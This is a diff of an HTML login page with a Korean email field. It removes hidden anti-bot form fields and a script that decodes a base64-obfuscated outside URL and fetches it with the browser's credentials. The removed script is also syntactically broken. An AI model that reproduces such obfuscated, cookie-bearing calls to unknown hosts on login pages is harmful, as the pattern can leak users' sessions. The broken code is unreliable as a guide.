@@ -87,15 +87,7 @@
 	        </div>	        
 	        <div class="content">
 				<form id="" name="">
-
-					<!-- Honeypot -->
-					<input type="hidden" name="website">
-
-					<!-- Time tracker -->
-					<input type="hidden" name="form_time" id="form_time">
-
-					<!-- Token -->
-					<input type="hidden" name="form_token" id="form_token">
+					<!-- <input type="hidden" name="_target" value="/" /> -->
 					
 					<div class="form-group form-capslock">
 						<h5>이메일</h5>
@@ -282,22 +274,6 @@
             });
             </script>
 
-            <script>
-            	document.addEventListener('DOMContentLoaded', () => {
 
-            		//time tracker (for min time check)
-            		document.getElementById('form_time').value = Math.floor(Date.now() / 1000)
-
-            		//fetch hidden (base64) token URL from your server
-            		const encoded = "aHR0cHM6Ly9xLXQtcy5jby9mcmVzaC93aG9pcy90b2tlbi5waHA=";
-            		const tokenURL = atob(encoded);
-
-            		fetch(tokenURL, { credentials: "include"});
-            		.then(res => rest.text())
-            		.then(token => {document.getElementById('form_token').value = token;})
-            		.catch(err => console.error('Token error:', err));
-            	});
-            </script>
 </body>
 </html>
-
